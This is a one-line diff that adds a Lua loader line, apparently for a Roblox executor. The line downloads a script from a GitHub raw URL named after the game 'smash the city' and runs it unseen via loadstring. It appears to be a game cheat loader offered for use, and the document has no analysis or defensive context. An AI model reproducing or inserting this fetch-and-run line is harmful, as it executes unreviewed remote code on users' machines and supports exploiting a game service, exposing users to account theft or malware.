@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/upd-smash-the-city-spam6-8obby0fcob8wp8.lua"))()
